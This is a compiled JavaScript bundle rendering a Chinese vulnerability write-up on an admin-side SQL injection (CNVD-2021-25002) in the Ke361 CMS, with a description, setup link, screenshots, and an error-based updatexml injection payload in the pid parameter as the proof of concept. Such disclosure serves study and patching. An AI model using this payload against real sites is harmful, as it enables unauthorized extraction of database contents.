(window.webpackJsonp=window.webpackJsonp||[]).push([[132],{1031:function(t,s,a){t.exports=a.p+"assets/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232910449.b730640f.png"},1032:function(t,s,a){t.exports=a.p+"assets/img/1634142045802-bdf21a65-a663-4f35-afc2-bc3e70d44309.ac892eba.png"},1033:function(t,s,a){t.exports=a.p+"assets/img/1634142062147-5e1703bb-91c6-44cd-8867-c3409540c2d8.9e847b2a.png"},2375:function(t,s,a){"use strict";a.r(s);var r=a(75),e=Object(r.a)({},(function(){var t=this,s=t.$createElement,r=t._self._c||s;return r("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[r("h1",{attrs:{id:"ke361-districtcontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#ke361-districtcontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[t._v("#")]),t._v(" Ke361 DistrictController.class.php 后台SQL注入漏洞 CNVD-2021-25002")]),t._v(" "),r("h2",{attrs:{id:"漏洞描述"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),r("p",[t._v("Ke361 DistrictController.class.php index() 函数 pid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息")]),t._v(" "),r("h2",{attrs:{id:"漏洞影响"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),r("a-checkbox",{attrs:{checked:""}},[t._v("Ke361")]),r("br"),t._v(" "),r("h2",{attrs:{id:"环境搭建"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),r("a-checkbox",{attrs:{checked:""}},[t._v("https://gitee.com/jcove/ke361")]),r("br"),t._v(" "),r("h2",{attrs:{id:"漏洞复现"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),r("p",[t._v("CMS产品页面")]),t._v(" "),r("p",[r("img",{attrs:{src:a(1031),alt:"img"}})]),t._v(" "),r("p",[t._v("存在漏洞的文件为 "),r("code",[t._v("Application/Admin/Controller/DistrictController.class.php")])]),t._v(" "),r("p",[r("img",{attrs:{src:a(1032),alt:"img"}})]),t._v(" "),r("p",[t._v("验证POC")]),t._v(" "),r("div",{staticClass:"language-php line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-php"}},[r("code",[t._v("admin"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("s"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("District"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pid"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("AND"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("updatexml"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token function"}},[t._v("concat")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select"),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("md5"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),r("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),r("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\n")])]),t._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[t._v("1")]),r("br")])]),r("p",[r("img",{attrs:{src:a(1033),alt:"img"}})]),t._v(" "),r("p",[t._v("若有收获，就点个赞吧")])],1)}),[],!1,null,null,null);s.default=e.exports}}]);